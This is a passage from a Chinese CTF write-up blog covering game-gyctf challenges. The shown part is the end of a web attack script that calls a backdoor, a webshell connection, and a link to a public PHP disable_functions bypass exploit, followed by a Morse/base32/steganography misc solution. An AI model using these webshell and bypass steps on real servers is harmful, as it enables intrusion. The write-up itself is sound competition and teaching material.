class="line">req()</span><br><span class="line">register(data)</span><br><span class="line">login(data)</span><br><span class="line">search()</span><br><span class="line">backdoor()</span><br></pre></td></tr></table></figure>
+
+<p>然后蚁剑连，发现没法执行系统命令，查看phpinfo()，发现：</p>
+<img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200225170417.png" style="zoom:80%;">
+
+<p>常规的bypass方法都不能用了，这里有个项目是关于php7 bypass disable_function的：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/">https://github.com/mm0r1/exploits/</a></p>
+<p>这里用的就是：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="code-in-morse"><a href="#code-in-morse" class="headerlink" title="code_in_morse"></a>code_in_morse</h3><p>文件是流量包，wireshark打开，导出所有http对象发现有个<code>12.jpg</code>，无法显示</p>
+<p>hxd打开发现是摩斯密码，解密的base32，再解密发现就乱码了但能看出来是png文件</p>
+<p>写了个脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = open(<span class="string">&#x27;12.jpg&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">s = a.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">dict = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..--..&#x27;</span>: <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-.&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--.-&#x27;</span>: <span class="string">&#x27;()&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....-&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.-.-&#x27;</span>: <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line">tr=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s:</span><br><span class="line">	<span class="keyword">if</span> item <span class="keyword">in</span> dict:</span><br><span class="line">		tr+=dict[item]</span><br><span class="line"><span class="comment"># print(tr)</span></span><br><span class="line"><span class="keyword">if</span> len(tr)%<span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">	tr+=<span class="string">&#x27;=&#x27;</span>*(<span class="number">8</span>-len(tr)%<span class="number">8</span>)</span><br><span class="line">de=base64.b32decode(tr.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">	fp.write(de)</span><br><span class="line"><span class="comment"># print(de)</span></span><br></pre></td></tr></table></figure>
+
+<p>可以直接生成png图片</p>
+<p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/1.png"></p>
+<p>pdf417解密，解密地址：<a target="_blank" rel="noopener" href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;s2.ax1x.com&#x2F;2020&#x2F;02&#x2F;06&#x2F;1yPXJ1.jpg</span><br></pre></td></tr></table></figure>
+
+<p>套娃，下载下来，查看属性发现F5，猜测F5隐写，没想到是没密码的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract 1yPXJ1.jpg</span><br></pre></td></tr></table></figure>
+
+<p>在<code>output.txt</code>里找到flag</p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/>http://www.m00nback.xyz/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-03-08T17:51:04+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年3月8日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/&title=新春战疫赛game-gyctf部分writeup - 明月归的小站&summary=本篇博客主要介绍了game-gyctf的部分writeup！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/&title=新春战疫赛game-gyctf部分writeup - 明月归的小站&summary=本篇博客主要介绍了game-gyctf的部分writeup！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/&title=新春战疫赛game-gyctf部分writeup - 明月归的小站&summary=本篇博客主要介绍了game-gyctf的部分writeup！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>metasploit学习</p>
+                <p class='content'>本篇博客主要介绍了msf的相关内容！
+
+
+什么是msf?msf全称Metasploit Framework，它集成了各平台上常见的溢出漏洞和流行的 shellcode ，并且不断更新，是目前世界...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'>
+                <p class='title'>日志分析<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了日志审计的相关内容！
+
+
+系统日志windows日志分析日志记录了系统中硬件、软件和系统问题的信息，同时还监视着系统中发生的事件。当服务器被入侵或者系统（应用）出现问题时，管理...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%8B%9B%E8%81%98%E7%B3%BB%E7%BB%9F"><span class="toc-text">简单的招聘系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easysqli-copy"><span class="toc-text">easysqli_copy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezsqli"><span class="toc-text">Ezsqli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyphp"><span class="toc-text">babyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blacklist"><span class="toc-text">blacklist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flaskapp"><span class="toc-text">Flaskapp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E8%AF%BB%E5%8F%96pin%E7%A0%81"><span class="toc-text">不读取pin码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96pin%E7%A0%81"><span class="toc-text">读取pin码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-thinking"><span class="toc-text">easy_thinking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#code-in-morse"><span class="toc-text">code_in_morse</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
